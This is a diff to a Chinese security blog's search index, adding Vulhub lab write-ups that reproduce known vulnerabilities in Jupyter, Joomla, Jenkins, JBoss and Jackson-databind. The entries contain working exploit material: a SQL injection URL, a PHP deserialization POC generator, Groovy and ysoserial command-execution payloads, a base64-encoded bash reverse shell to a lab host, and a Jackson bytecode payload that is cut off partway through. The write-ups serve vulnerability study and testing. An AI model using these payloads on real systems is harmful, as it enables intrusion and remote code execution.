@@ -17,6 +17,767 @@
       </tags>
   </entry>
   <entry>
+    <title>Jupyter Notebook 未授权访问漏洞</title>
+    <url>/2021/08/23/Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Jupyter-Notebook-未授权访问漏洞"><a href="#Jupyter-Notebook-未授权访问漏洞" class="headerlink" title="Jupyter Notebook 未授权访问漏洞"></a>Jupyter Notebook 未授权访问漏洞</h1><p>Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。</p>
+<p>如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>运行后，访问<code>http://192.168.44.132:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
+<p>选择 new -&gt; terminal 即可创建一个控制台：</p>
+<p><img src="https://image.3001.net/images/20210824/1629802925600.png" alt="image-20210824172359802"></p>
+<p>直接执行任意命令：</p>
+<p><img src="https://image.3001.net/images/20210824/16298029283836.png" alt="image-20210824172420290"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Jupyter</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Joomla 3.7.0 (CVE-2017-8917) SQL注入漏洞</title>
+    <url>/2021/08/23/Joomla%203.7.0%20(CVE-2017-8917)%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Joomla-3-7-0-CVE-2017-8917-SQL注入漏洞"><a href="#Joomla-3-7-0-CVE-2017-8917-SQL注入漏洞" class="headerlink" title="Joomla 3.7.0 (CVE-2017-8917) SQL注入漏洞"></a>Joomla 3.7.0 (CVE-2017-8917) SQL注入漏洞</h1><p>com_fields组件出现漏洞，com_fields组件是在3.7版本添加的，如果你使用此版本，将受到影响，并应尽快更新。这个组件可以公开访问，意味着任何能访问你站点的用户都可以发起攻击。</p>
+<p>Joomla于5月17日发布了新版本3.7.1,（<a href="https://www.joomla.org/announcements/release-news/5705-joomla-3-7-1-release.html），本次更新中修复一个高危SQL注入漏洞（https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html），成功利用该漏洞后攻击者可以在未授权的情况下进行SQL注入。" target="_blank" rel="noopener">https://www.joomla.org/announcements/release-news/5705-joomla-3-7-1-release.html），本次更新中修复一个高危SQL注入漏洞（https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html），成功利用该漏洞后攻击者可以在未授权的情况下进行SQL注入。</a></p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动后访问<code>http://192.168.44.132:8080</code>即可看到Joomla的安装界面，当前环境的数据库信息为：</p>
+<ul>
+<li>数据库地址：mysql:3306</li>
+<li>用户：root</li>
+<li>密码：root</li>
+<li>数据库名：joomla</li>
+</ul>
+<p>填入上述信息，正常安装即可。</p>
+<p>安装完成后，访问<code>http://192.168.44.132:8080/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)</code>，即可看到报错信息：</p>
+<p><img src="https://image.3001.net/images/20210824/16297960491373.png" alt="image-20210824165806908"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Joomla</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Joomla 3.4.5 反序列化漏洞（CVE-2015-8562）</title>
+    <url>/2021/08/23/Joomla%203.4.5%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-8562%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Joomla-3-4-5-反序列化漏洞（CVE-2015-8562）"><a href="#Joomla-3-4-5-反序列化漏洞（CVE-2015-8562）" class="headerlink" title="Joomla 3.4.5 反序列化漏洞（CVE-2015-8562）"></a>Joomla 3.4.5 反序列化漏洞（CVE-2015-8562）</h1><p>本漏洞根源是PHP5.6.13前的版本在读取存储好的session时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入4字节的utf8数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。</p>
+<p>通过Joomla中的Gadget，可造成任意代码执行的结果。</p>
+<p>详情可参考：</p>
+<ul>
+<li><a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html</a></li>
+</ul>
+<p>影响版本</p>
+<ul>
+<li>Joomla 1.5.x, 2.x, and 3.x before 3.4.6</li>
+<li>PHP 5.6 &lt; 5.6.13, PHP 5.5 &lt; 5.5.29 and PHP 5.4 &lt; 5.4.45</li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动后访问<code>http://192.168.44.132:8080/</code>即可看到Joomla的安装界面，当前环境的数据库信息为：</p>
+<ul>
+<li>数据库地址：mysql:3306</li>
+<li>用户：root</li>
+<li>密码：root</li>
+<li>数据库名：joomla</li>
+</ul>
+<p>填入上述信息，正常安装即可。</p>
+<p>然后我们不带User-Agent头，先访问一次目标主页，记下服务端返回的Cookie：</p>
+<p><img src="https://image.3001.net/images/20210824/1629796001762.png" alt="image-20210824151032614"></p>
+<p>再用如下脚本生成POC：（<a href="http://sandbox.onlinephpfunctions.com/code/17e7080841ccce12f6c6e0bb1de01b9e390510bd" target="_blank" rel="noopener">在线运行</a>）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSimplepieFactory</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysql</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $sanitize;</span><br><span class="line">    <span class="keyword">var</span> $cache;</span><br><span class="line">    <span class="keyword">var</span> $cache_name_function;</span><br><span class="line">    <span class="keyword">var</span> $javascript;</span><br><span class="line">    <span class="keyword">var</span> $feed_url;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;feed_url = <span class="string">"phpinfo();JFactory::getConfig();exit;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;javascript = <span class="number">9999</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache_name_function = <span class="string">"assert"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sanitize = <span class="keyword">new</span> JDatabaseDriverMysql();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysqli</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $a;</span><br><span class="line">    <span class="keyword">protected</span> $disconnectHandlers;</span><br><span class="line">    <span class="keyword">protected</span> $connection;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> JSimplepieFactory();</span><br><span class="line">        $x = <span class="keyword">new</span> SimplePie();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;disconnectHandlers = [</span><br><span class="line">            [$x, <span class="string">"init"</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> JDatabaseDriverMysqli();</span><br><span class="line">$poc = serialize($a); </span><br><span class="line"></span><br><span class="line">$poc = str_replace(<span class="string">"\x00*\x00"</span>, <span class="string">'\\0\\0\\0'</span>, $poc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"123&#125;__test|&#123;$poc&#125;\xF0\x9D\x8C\x86"</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210824/16297960053101.png" alt="image-20210824154725611"></p>
+<p>将生成好的POC作为User-Agent，带上第一步获取的Cookie发包，这一次发包，脏数据进入Mysql数据库。然后同样的包再发一次，我们的代码被执行：</p>
+<p><img src="https://image.3001.net/images/20210824/16297960086572.png" alt="image-20210824154736588"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Joomla</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）</title>
+    <url>/2021/08/23/Jenkins-CI%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-1000353%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Jenkins-CI-远程代码执行漏洞（CVE-2017-1000353）"><a href="#Jenkins-CI-远程代码执行漏洞（CVE-2017-1000353）" class="headerlink" title="Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）"></a>Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>参考阅读 <a href="https://blogs.securiteam.com/index.php/archives/3171" target="_blank" rel="noopener">https://blogs.securiteam.com/index.php/archives/3171</a></p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>等待完全启动成功后，访问<code>http://192.168.44.132:8080</code>即可看到jenkins已成功运行，无需手工安装。</p>
+<h3 id="步骤一、生成序列化字符串"><a href="#步骤一、生成序列化字符串" class="headerlink" title="步骤一、生成序列化字符串"></a>步骤一、生成序列化字符串</h3><p>参考<a href="https://github.com/vulhub/CVE-2017-1000353，首先下载[CVE-2017-1000353-1.1-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar)，这是生成POC的工具。" target="_blank" rel="noopener">https://github.com/vulhub/CVE-2017-1000353，首先下载[CVE-2017-1000353-1.1-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar)，这是生成POC的工具。</a></p>
+<p>执行下面命令，生成字节码文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser <span class="string">"touch /tmp/success"</span></span><br><span class="line"><span class="comment"># jenkins_poc.ser是生成的字节码文件名</span></span><br><span class="line"><span class="comment"># "touch ..."是待执行的任意命令</span></span><br></pre></td></tr></table></figure>
+
+<p>执行上述代码后，生成jenkins_poc.ser文件，这就是序列化字符串。</p>
+<p>下载<a href="https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py" target="_blank" rel="noopener">exploit.py</a>，python3执行<code>python exploit.py http://192.168.44.132:8080 jenkins_poc.ser</code>，将刚才生成的字节码文件发送给目标：</p>
+<p><img src="https://image.3001.net/images/20210824/16297708322462.png" alt="image-20210823172745321"></p>
+<p>进入docker，发现<code>/tmp/success</code>成功被创建，说明命令执行漏洞利用成功：</p>
+<p><img src="https://image.3001.net/images/20210824/16297708356471.png" alt="image-20210823172659233"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Jenkins</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Jenkins远程命令执行漏洞（CVE-2018-1000861）</title>
+    <url>/2021/08/23/Jenkins%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1000861%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Jenkins远程命令执行漏洞（CVE-2018-1000861）"><a href="#Jenkins远程命令执行漏洞（CVE-2018-1000861）" class="headerlink" title="Jenkins远程命令执行漏洞（CVE-2018-1000861）"></a>Jenkins远程命令执行漏洞（CVE-2018-1000861）</h1><p>Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。</p>
+<p>通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html" target="_blank" rel="noopener">http://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html</a></li>
+<li><a href="http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html" target="_blank" rel="noopener">http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html</a></li>
+<li><a href="https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>即可看到一个已经成功初始化的Jenkins，无需再进行任何操作。</p>
+<p>使用 @orangetw 给出的<a href="https://github.com/orangetw/awesome-jenkins-rce-2019" target="_blank" rel="noopener">一键化POC脚本</a>，发送如下请求即可成功执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;securityRealm&#x2F;user&#x2F;admin&#x2F;descriptorByName&#x2F;org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript&#x2F;checkScript</span><br><span class="line">?sandbox&#x3D;true</span><br><span class="line">&amp;value&#x3D;public class x &#123;</span><br><span class="line">  public x()&#123;</span><br><span class="line">    &quot;touch &#x2F;tmp&#x2F;success&quot;.execute()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210824/16297709021992.png" alt="image-20210823180547451"></p>
+<p><code>/tmp/success</code>已成功创建：</p>
+<p><img src="https://image.3001.net/images/20210824/1629770905268.png" alt="image-20210823180601259"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Jenkins</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</title>
+    <url>/2021/08/23/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7504%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><a href="#JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）" class="headerlink" title="JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）"></a>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</h1><p>Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener">https://github.com/joaomatosf/JavaDeserH2HC</a></li>
+<li><a href="https://www.youtube.com/watch?v=jVMr4eeJ2Po" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jVMr4eeJ2Po</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，目标为<code>http://192.168.44.132:8080</code>。</p>
+<p>该漏洞出现在<code>/jbossmq-httpil/HTTPServerILServlet</code>请求中，我们借助ysoserial的eCommonsCollections5利用链来复现。生成Payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 &quot;touch &#x2F;tmp&#x2F;success&quot; &gt; 1.ser</span><br></pre></td></tr></table></figure>
+
+<p>我们将1.ser文件内容作为POST Body发送：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @1.ser</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210823/16297093071661.png" alt="image-20210823164704600"></p>
+<p>执行<code>docker-compose exec jboss bash</code>进入容器，可见<code>/tmp/success</code>已成功创建。</p>
+<p><img src="https://image.3001.net/images/20210823/16297093162750.png" alt="image-20210823164636884"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>JBoss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</title>
+    <url>/2021/08/17/JBoss%205.x6.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</h1><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/zUJMt9hdGoz1TEOKy2Cgdg</a></li>
+<li><a href="https://access.redhat.com/security/cve/cve-2017-12149" target="_blank" rel="noopener">https://access.redhat.com/security/cve/cve-2017-12149</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://192.168.44.132:8080/</code>即可看到JBoss默认页面。</p>
+<p>该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化：</p>
+<p><img src="https://image.3001.net/images/20210818/16292507206067.png" alt="image-20210817172221375"></p>
+<p>所以，我们用常规Java反序列化漏洞测试方法来复现该漏洞。</p>
+<p>我们使用bash来反弹shell，但由于<code>Runtime.getRuntime().exec()</code>中不能使用管道符等bash需要的方法，我们需要用进行一次编码。</p>
+<p>工具：<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<p>使用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMi80NDQ0IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure>
+
+<p>生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可：</p>
+<p><img src="https://image.3001.net/images/20210818/1629250724562.png" alt="image-20210817173505127"></p>
+<p>成功反弹shell：</p>
+<p><img src="https://image.3001.net/images/20210818/16292507285446.png" alt="image-20210817173521264"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>JBoss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JBoss JMXInvokerServlet 反序列化漏洞</title>
+    <url>/2021/08/17/JBoss%20JMXInvokerServlet%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="JBoss-JMXInvokerServlet-反序列化漏洞"><a href="#JBoss-JMXInvokerServlet-反序列化漏洞" class="headerlink" title="JBoss JMXInvokerServlet 反序列化漏洞"></a>JBoss JMXInvokerServlet 反序列化漏洞</h1><p>这是经典的JBoss反序列化漏洞，JBoss在<code>/invoker/JMXInvokerServlet</code>请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。</p>
+<p>参考文档：</p>
+<ul>
+<li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank" rel="noopener">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li>
+<li><a href="https://www.seebug.org/vuldb/ssvid-89723" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89723</a></li>
+<li><a href="http://www.freebuf.com/sectool/88908.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/88908.html</a></li>
+<li><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">https://paper.seebug.org/312/</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://192.168.44.132:8080/</code>即可看到JBoss默认页面。</p>
+<p>JBoss在处理<code>/invoker/JMXInvokerServlet</code>请求的时候读取了对象，所以我们直接将<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>生成好的POC附在POST Body中发送即可。整个过程可参考<a href="https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149" target="_blank" rel="noopener">jboss/CVE-2017-12149</a>，我就不再赘述。</p>
+<p>网上已经有很多EXP了，比如<a href="https://cdn.vulhub.org/deserialization/DeserializeExploit.jar" target="_blank" rel="noopener">DeserializeExploit.jar</a>，直接用该工具执行命令、上传文件即可：</p>
+<p><img src="https://image.3001.net/images/20210818/16292506982325.png" alt="image-20210817162514937"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>JBoss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Jackson-databind 反序列化漏洞（CVE-2017-7525）</title>
+    <url>/2021/08/16/Jackson-databind%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7525%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Jackson-databind-反序列化漏洞（CVE-2017-7525）"><a href="#Jackson-databind-反序列化漏洞（CVE-2017-7525）" class="headerlink" title="Jackson-databind 反序列化漏洞（CVE-2017-7525）"></a>Jackson-databind 反序列化漏洞（CVE-2017-7525）</h1><p>Jackson-databind 支持 <a href="https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization" target="_blank" rel="noopener">Polymorphic Deserialization</a> 特性（默认情况下不开启），当 json 字符串转换的 Target class 中有 polymorph fields，即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 <code>TemplatesImpl</code>，可以实现任意代码执行。</p>
+<p>所以，本漏洞利用条件如下：</p>
+<ul>
+<li><p>开启 JacksonPolymorphicDeserialization，即调用以下任意方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">objectMapper.enableDefaultTyping(); <span class="comment">// default to using DefaultTyping.OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Target class 需要有无参 constructor</p>
+</li>
+<li><p>Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 / 实现接口</p>
+</li>
+</ul>
+<h3 id="CVE-2017-7525"><a href="#CVE-2017-7525" class="headerlink" title="CVE-2017-7525"></a>CVE-2017-7525</h3><p><code>Jackson-databind</code> 在设置 Target class 成员变量参数值时，若没有对应的 getter 方法，则会使用 <code>SetterlessProperty</code> 调用 getter 方法，获取变量，然后设置变量值。当调用 <code>getOutputProperties()</code> 方法时，会初始化 <code>transletBytecodes</code> 包含字节码的类，导致命令执行，具体可参考 <a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/" target="_blank" rel="noopener">java-deserialization-jdk7u21-gadget-note</a> 中关于 <code>TemplatesImpl</code> 的说明。</p>
+<p>使用JDK7u21的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>作为Gadget，发送如下请求，将会执行<code>touch /tmp/prove1.txt</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;exploit HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 1298</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;param&quot;: [</span><br><span class="line">    &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;transletBytecodes&quot;: [</span><br><span class="line">  &quot;yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw&#x3D;&#x3D;&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;transletName&quot;: &quot;a.b&quot;,</span><br><span class="line">      